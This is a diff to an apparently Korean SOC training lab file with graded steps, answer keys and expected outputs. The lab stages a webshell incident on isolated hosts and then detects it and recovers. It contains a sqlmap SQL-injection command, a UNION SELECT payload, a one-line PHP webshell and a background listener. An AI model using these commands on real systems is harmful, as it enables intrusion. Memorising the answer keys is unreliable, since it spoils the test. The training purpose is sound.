@@ -87,7 +87,7 @@ steps:
 
       ```bash
       # ── 외부 공격자 VM 192.168.0.202 에서: SQLi 침투 — sqlmap UA 주입(ModSec 942 탐지) ──
-      echo -en 'GET /?id=socw10%27%20UNION%20SELECT%201--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null
+      sqlmap -u 'http://dvwa.el34.lab/?id=socw10' --batch --level=2 --risk=2 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear|403 \(Forbidden\)' | head -3
       # ── el34-web 에서: 웹쉘 파일 배치 + 콜백 리스너(비표준 포트 44410) 상주 ──
       echo "<?php system(\$_GET[c]); ?>" > /tmp/socw10_shell.php; nohup python3 -m http.server 44410 >/dev/null 2>&1 & echo planted
       # 로그 수렴 대기 후 완료 마커
@@ -104,7 +104,7 @@ steps:
     points: 10
     answer: |
       # 1) SQLi 침투 — sqlmap UA로 주입(ModSec 942 탐지)
-      ssh att@192.168.0.202 "echo -en 'GET /?id=socw10%27%20UNION%20SELECT%201--%20- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: sqlmap/1.7\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null"
+      ssh att@192.168.0.202 "sqlmap -u 'http://dvwa.el34.lab/?id=socw10' --batch --level=2 --risk=2 --flush-session --disable-coloring 2>&1 | grep -iE 'WAF/IPS|do not appear|403 \(Forbidden\)' | head -3"
       # 2) 웹쉘 파일 배치 + 콜백 리스너(비표준 포트 44410) 상주
       ssh ccc@10.20.32.80 'echo "<?php system(\$_GET[c]); ?>" > /tmp/socw10_shell.php; nohup python3 -m http.server 44410 >/dev/null 2>&1 & echo planted'
       # 3) 로그 수렴 대기 후 완료 마커
@@ -112,6 +112,7 @@ steps:
       echo "webshell incident done"
     answer_detail: "웹쉘 침해의 세 구성요소를 재현한다 — SQLi 침투(sqlmap UA 요청, ModSec 942로 탐지) + 웹쉘 파일(/tmp/socw10_shell.php, system($_GET[c]) 한 줄) + 콜백 리스너(비표준 포트 44410). 이 셋이 각각 웹 로그·디스크·네트워크에 흔적을 남겨 이후 모든 포렌식·헌팅 미션의 원천 데이터가 된다. 검증을 단순화하려 UNION SELECT 1로 침투를 재현하되 웹쉘 파일·리스너 배치는 동일하다."
     expected_output: |
+      403 (Forbidden) - 445 times
       planted
       webshell incident done
     verify:
@@ -252,7 +253,7 @@ steps:
       sudo suricatasc -c reload-rules
 
       # ── 외부 공격자 VM 192.168.0.202 에서: 출발지 트래픽 유발 ──
-      echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null
+      whatweb -a1 http://dvwa.el34.lab/ >/dev/null 2>&1
 
       # ── el34-ips 에서: 격리 룰 트리거 횟수(1+) + self-clean(룰 삭제 + reload) (4초 후) ──
       sudo grep -c 9510001 /var/log/suricata/eve.json
@@ -273,7 +274,7 @@ steps:
       EOF"'
       # 2) 룰 즉시 반영 후 출발지 트래픽 유발
       ssh ccc@10.20.31.2 'sudo suricatasc -c reload-rules'
-      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 >/dev/null"; timeout 12 bash -c 'until ssh ccc@10.20.31.2 \"sudo grep -q 9510001 /var/log/suricata/eve.json\"; do :; done' || true
+      ssh att@192.168.0.202 "whatweb -a1 http://dvwa.el34.lab/ >/dev/null 2>&1"; timeout 12 bash -c 'until ssh ccc@10.20.31.2 \"sudo grep -q 9510001 /var/log/suricata/eve.json\"; do :; done' || true
       # 3) 격리 룰 트리거 횟수(1+ = 출발지 포착)
       ssh ccc@10.20.31.2 'sudo grep 9510001 /var/log/suricata/eve.json | jq -s length'
       # 4) self-clean — 격리 룰 삭제 + reload(공유 인프라 원복)
@@ -356,7 +357,7 @@ steps:
 
       ```bash
       # 1) Recover — 웹 서비스 헬스체크(응답코드만)
-      echo "web=$(echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 localhost 80 | head -1 | grep -oE '[0-9]{3}')"
+      curl -s -o /dev/null -w 'web=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://localhost/
       # 2) 잔재 점검 — 웹쉘 파일(ls)·콜백 리스너(pgrep) 둘 다 없으면 clean
       ls /tmp/socw10_shell.php >/dev/null 2>&1 && echo "웹쉘 잔재!" || echo clean; pgrep -f "[h]ttp.server 44410" && echo "리스너 잔재!" || echo "listener clean"
       # 3) 해석 — 서비스 정상 + 잔재 0 = 복구 완료, 취약점 패치 권고
@@ -372,12 +373,12 @@ steps:
     points: 12
     answer: |
       # 1) Recover — 웹 서비스 헬스체크(응답코드만)
-      ssh ccc@10.20.32.80 'echo "web=$(echo -en 'GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 localhost 80 | head -1 | grep -oE '[0-9]{3}')"'
+      ssh ccc@10.20.32.80 "curl -s -o /dev/null -w 'web=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://localhost/"
       # 2) 잔재 점검 — 웹쉘 파일(ls)·콜백 리스너(pgrep) 둘 다 없으면 clean
       ssh ccc@10.20.32.80 'ls /tmp/socw10_shell.php >/dev/null 2>&1 && echo "웹쉘 잔재!" || echo clean; pgrep -f "[h]ttp.server 44410" && echo "리스너 잔재!" || echo "listener clean"'
       # 3) 해석 — 서비스 정상 + 잔재 0 = 복구 완료, 취약점 패치 권고
       # → 서비스 정상 + 잔재 0 = 복구 완료. 취약점 패치 권고
-    answer_detail: "Recover는 복구 완료를 객관적으로 판정하는 단계 — 두 조건을 증거로 확인한다. (1) 웹 서비스 정상(nc 응답코드, 제거가 서비스를 건드리지 않았나) (2) 웹쉘 파일(ls)·콜백 리스너(pgrep) 잔재 0(clean + listener clean). 둘 다 충족돼야 종결. 단 복구가 끝은 아니다 — 근본 취약점(SQLi)을 패치하지 않으면 같은 길로 재침투하므로, 패치·업로드 검증·웹디렉터리 실행권한 제거·웹쉘 탐지룰까지 재발 방지를 권고한다. 채점은 clean 출력을 본다."
+    answer_detail: "Recover는 복구 완료를 객관적으로 판정하는 단계 — 두 조건을 증거로 확인한다. (1) 웹 서비스 정상(curl 응답코드, 제거가 서비스를 건드리지 않았나) (2) 웹쉘 파일(ls)·콜백 리스너(pgrep) 잔재 0(clean + listener clean). 둘 다 충족돼야 종결. 단 복구가 끝은 아니다 — 근본 취약점(SQLi)을 패치하지 않으면 같은 길로 재침투하므로, 패치·업로드 검증·웹디렉터리 실행권한 제거·웹쉘 탐지룰까지 재발 방지를 권고한다. 채점은 clean 출력을 본다."
     expected_output: |
       web=302
       clean
